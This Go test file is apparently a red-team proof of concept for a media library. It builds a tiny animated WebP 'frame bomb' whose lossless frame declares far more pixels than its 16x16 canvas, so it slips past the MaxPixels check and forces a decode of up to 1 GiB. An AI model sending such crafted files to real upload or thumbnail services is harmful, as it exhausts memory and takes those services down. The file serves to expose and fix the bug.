package media

// Red-team proofs of concept (not product tests). Tests named
// TestRedteam* FAIL while the bug they describe exists.

import (
	"bytes"
	"encoding/binary"
	"errors"
	"os"
	"runtime"
	"strconv"
	"testing"
	"time"
)

// bitWriter writes LSB-first bit fields, as VP8L expects.
type bitWriter struct {
	b    []byte
	acc  uint64
	nacc uint
}

func (w *bitWriter) put(v uint64, n uint) {
	w.acc |= v << w.nacc
	w.nacc += n
	for w.nacc >= 8 {
		w.b = append(w.b, byte(w.acc))
		w.acc >>= 8
		w.nacc -= 8
	}
}

func (w *bitWriter) bytes() []byte {
	if w.nacc > 0 {
		w.b = append(w.b, byte(w.acc))
		w.acc, w.nacc = 0, 0
	}
	return w.b
}

// vp8lFlat is a ~10-byte lossless bitstream declaring w×h pixels: no
// transforms, no colour cache, five single-symbol prefix codes, so every
// pixel decodes from zero bits.
func vp8lFlat(w, h int) []byte {
	var bw bitWriter
	bw.put(0x2f, 8)
	bw.put(uint64(w-1), 14)
	bw.put(uint64(h-1), 14)
	bw.put(0, 1)  // alpha hint
	bw.put(0, 3)  // version
	bw.put(0, 1)  // no transform
	bw.put(0, 1)  // no colour cache
	bw.put(0, 1)  // no meta prefix codes
	for range 5 { // green, red, blue, alpha, distance
		bw.put(1, 1) // simple code
		bw.put(0, 1) // one symbol
		bw.put(0, 1) // 1-bit symbol
		bw.put(0, 1) // symbol 0
	}
	return bw.bytes()
}

func riffChunk(id string, payload []byte) []byte {
	b := append([]byte(id), binary.LittleEndian.AppendUint32(nil, uint32(len(payload)))...)
	b = append(b, payload...)
	if len(payload)&1 == 1 {
		b = append(b, 0)
	}
	return b
}

func u24le(v int) []byte { return []byte{byte(v), byte(v >> 8), byte(v >> 16)} }

// webpFrameBomb is an animated WebP whose VP8X canvas (the only size the
// pixel check sees) is canvas×canvas, with frames each holding a lossless
// bitstream that declares fw×fh pixels.
func webpFrameBomb(canvas, fw, fh, frames int) []byte {
	vp8x := append([]byte{0x02, 0, 0, 0}, u24le(canvas-1)...)
	vp8x = append(vp8x, u24le(canvas-1)...)
	body := []byte("WEBP")
	body = append(body, riffChunk("VP8X", vp8x)...)
	body = append(body, riffChunk("ANIM", make([]byte, 6))...)
	for range frames {
		anmf := append(u24le(0), u24le(0)...)
		anmf = append(anmf, u24le(canvas-1)...) // frame rect = canvas
		anmf = append(anmf, u24le(canvas-1)...)
		anmf = append(anmf, u24le(100)...) // 100 ms
		anmf = append(anmf, 0)
		anmf = append(anmf, riffChunk("VP8L", vp8lFlat(fw, fh))...)
		body = append(body, riffChunk("ANMF", anmf)...)
	}
	return append(append([]byte("RIFF"), binary.LittleEndian.AppendUint32(nil, uint32(len(body)))...), body...)
}

func allocDuring(fn func()) (uint64, time.Duration) {
	var a, b runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&a)
	start := time.Now()
	fn()
	d := time.Since(start)
	runtime.ReadMemStats(&b)
	return b.TotalAlloc - a.TotalAlloc, d
}

// TestRedteamWebPFrameBombBypassesMaxPixels: Thumbnail (run synchronously
// in the upload request by mediajobs.OnCreate) checks only the VP8X canvas
// against MaxPixels, then decodes the first ANMF frame, whose VP8L
// bitstream may declare up to 16384×16384 (1 GiB of NRGBA) in ~10 bytes.
// decodeWebPFrame rewraps lossless frames without a VP8X header, so
// x/image/webp's own canvas/bitstream consistency check does not apply.
func TestRedteamWebPFrameBombBypassesMaxPixels(t *testing.T) {
	fw := 4096
	if v, err := strconv.Atoi(os.Getenv("REDTEAM_WEBP_FRAME")); err == nil && v > 0 {
		fw = v // 16384 for the full-size bomb (1 GiB)
	}
	data := webpFrameBomb(16, fw, fw, 1)
	t.Logf("file is %d bytes, canvas 16x16, frame bitstream %dx%d", len(data), fw, fw)
	path := putFile(t, "bomb.webp", data)
	typ := sniffPath(t, path)
	r := NewImageRunner(Config{MaxPixels: 1_000_000})
	var err error
	alloc, d := allocDuring(func() { _, err = r.Thumbnail(testCtx(t), path, typ, &bytes.Buffer{}) })
	t.Logf("Thumbnail: err=%v, allocated %d MiB in %s", err, alloc>>20, d)
	if !errors.Is(err, ErrTooLarge) {
		t.Errorf("Thumbnail decoded a %dx%d frame (%d px) with MaxPixels 1e6; want ErrTooLarge before decoding", fw, fw, fw*fw)
	}
	if limit := uint64(4 * 1_000_000 * 4); alloc > limit {
		t.Errorf("allocated %d MiB, far above what MaxPixels allows (%d MiB)", alloc>>20, limit>>20)
	}
}
